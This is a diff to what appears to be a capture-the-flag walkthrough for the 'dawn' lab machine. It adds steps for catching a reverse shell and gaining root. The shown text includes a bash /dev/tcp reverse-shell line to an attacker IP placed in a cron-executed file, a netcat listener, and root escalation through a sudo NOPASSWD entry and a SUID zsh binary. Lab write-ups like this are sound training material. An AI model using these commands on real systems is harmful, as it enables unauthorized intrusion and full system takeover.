@@ -151,7 +151,7 @@ so i just put a random file in it using smbclient and checked the `management.lo
 ```
 meaning that the system tries to execute files `web-control` and `product-control` using `sh`
 
-## 3.Privilege Escalation
+## 3.Gaining Shell
 
 Let's make a file called `web-control` and put a reverse shell in it
 
@@ -160,3 +160,82 @@ Let's make a file called `web-control` and put a reverse shell in it
 
 bash -i >& /dev/tcp/192.168.56.102/4444 0>&1
 ```
+
+start a listener, wait afew seconds and boom :
+
+```bash
+root@kali: nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.102] from (UNKNOWN) [192.168.56.122] 55016
+bash: cannot set terminal process group (4007): Inappropriate ioctl for device
+bash: no job control in this shell
+
+www-data@dawn:~$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## 4.Privilege Escalation (Method 1)
+
+Check for sudo permissions :
+
+```bash
+www-data@dawn:~$ sudo -l 
+sudo -l
+Matching Defaults entries for www-data on dawn:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on dawn:
+    (root) NOPASSWD: /usr/bin/sudo
+```
+
+we can run sudo so :
+
+```bash
+www-data@dawn:~$ /usr/bin/sudo sudo /bin/bash
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+cat flag.txt
+Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!
+
+flag{3a3e52f0a6af0d6e36d7c1ced3a9fd59}
+```
+
+
+## 5.Privilege Escalation (Method 2)
+
+Check for SUID binaries :
+
+```bash
+www-data@dawn:~$ find / -user root -perm /4000 2>/dev/null
+
+/usr/sbin/mount.cifs
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/zsh
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/chfn
+```
+
+here we have `/usr/bin/zsh`, so we can get a shell :
+
+```bash
+www-data@dawn:~$ /usr/bin/zsh
+/usr/bin/zsh
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+```
+
+This is how you can get root on this machine :)
